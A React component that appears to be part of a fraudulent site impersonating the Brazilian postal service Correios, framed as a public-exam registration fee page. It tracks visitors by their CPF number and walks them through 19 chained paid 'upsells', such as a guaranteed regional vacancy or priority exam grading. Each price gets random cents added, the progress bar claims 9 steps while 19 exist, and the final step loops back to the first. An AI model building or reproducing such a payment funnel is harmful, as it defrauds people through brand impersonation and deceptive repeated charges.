import { useEffect, useState } from "react";
import { useNavigate, useLocation, useParams } from "react-router-dom";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import UpsellStep from "@/components/UpsellStep";
import { CPFData } from "@/lib/cpf";
import { getSession, saveSession } from "@/hooks/useSessionPersistence";

import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

const UPSELLS = [
  { valor: 47, title: "Confirmação da Inscrição", description: "Serviço opcional para receber confirmação adicional e comprovante consolidado da etapa." },
  { valor: 37, title: "Confirmação do Local da Prova", description: "Serviço opcional para receber apoio extra com detalhes do local e orientações de acesso." },
  { valor: 39, title: "Cartão de Acesso à Prova", description: "Serviço opcional para emissão facilitada do cartão em formato digital." },
  { valor: 27, title: "Seguro do Candidato", description: "Serviço opcional de proteção financeira conforme regras e coberturas informadas." },
  { valor: 33, title: "Apostila Digital Oficial", description: "Material complementar opcional para apoiar seus estudos." },
  { valor: 24, title: "Simulado Online da Banca", description: "Simulado opcional para treinar formato, tempo e gestão de prova." },
  { valor: 19, title: "Certificado de Pré-Aprovação", description: "Documento complementar opcional para organização pessoal e comprovação de candidatura." },
  { valor: 15, title: "Acompanhamento por SMS e E-mail", description: "Alerta opcional para receber atualizações do processo em canais adicionais." },
  { valor: 97, title: "Garantia de Vaga na Região", description: "Serviço opcional para priorização regional dentro das condições previstas." },
  { valor: 29, title: "Kit Documentos para Posse", description: "Checklist e materiais opcionais para organização da documentação." },
  { valor: 57, title: "Curso Preparatório Express", description: "Curso complementar opcional com foco prático para revisão rápida." },
  { valor: 22, title: "Recurso Administrativo", description: "Modelos e orientação opcional para apoio em recursos, quando aplicável." },
  { valor: 17, title: "Atualização do Edital", description: "Monitoramento opcional para avisos de mudanças relevantes no edital." },
  { valor: 31, title: "Prioridade na Correção", description: "Serviço opcional de acompanhamento com devolutiva antecipada quando disponível." },
  { valor: 23, title: "Certificado de Conclusão de Curso", description: "Apoio opcional para validação e organização de comprovantes acadêmicos." },
  { valor: 14, title: "Acesso ao Grupo VIP", description: "Comunidade opcional para troca de dicas e rotina de estudos." },
  { valor: 18, title: "Seguro Contra Atraso", description: "Cobertura opcional para imprevistos de deslocamento, conforme regras." },
  { valor: 43, title: "Consultoria Individual", description: "Atendimento opcional com direcionamento de estudo personalizado." },
  { valor: 67, title: "Pacote de Posse Garantida", description: "Pacote opcional com apoio documental e orientação para as etapas finais." },
];

const Upsell = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { step } = useParams<{ step: string }>();

  const parsedStep = parseInt(step || "1", 10);
  const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 19);
  const currentIndex = stepNumber - 1;
  const currentUpsell = UPSELLS[currentIndex];

  const [valorComCentavos] = useState(() => currentUpsell.valor + (Math.floor(Math.random() * 99) + 1) / 100);

  const session = getSession();
  const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
  const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;

  useEffect(() => { window.scrollTo(0, 0); }, [stepNumber]);

  useEffect(() => {
    if (!cpfData) { navigate("/"); return; }
    saveSession({ cpfData, currentStep: `/upsell/${stepNumber}`, valorBeneficio, protocolo });
    trackFunnelEvent(`upsell-${stepNumber}`, { cpf: cpfData.cpf });
  }, [cpfData, valorBeneficio, protocolo, navigate, stepNumber]);

  const handlePaymentConfirmed = () => {
    const stateData = { cpfData, valorBeneficio, protocolo };
    if (stepNumber < 19) {
      navigate(`/upsell-info/${stepNumber + 1}`, { state: stateData });
    } else {
      navigate("/upsell-info/1", { state: stateData });
    }
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb="Concursos > Inscrição > Taxas" />

      <main className="flex-1 flex items-center justify-center px-4 py-6 sm:py-8">
        <UpsellStep
          key={stepNumber}
          title={currentUpsell.title}
          description={currentUpsell.description}
          valor={valorComCentavos}
          cpfData={cpfData}
          protocolo={protocolo || `BB${Date.now()}`}
          onPaymentConfirmed={handlePaymentConfirmed}
          stepNumber={stepNumber}
          totalSteps={9}
        />
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default Upsell;
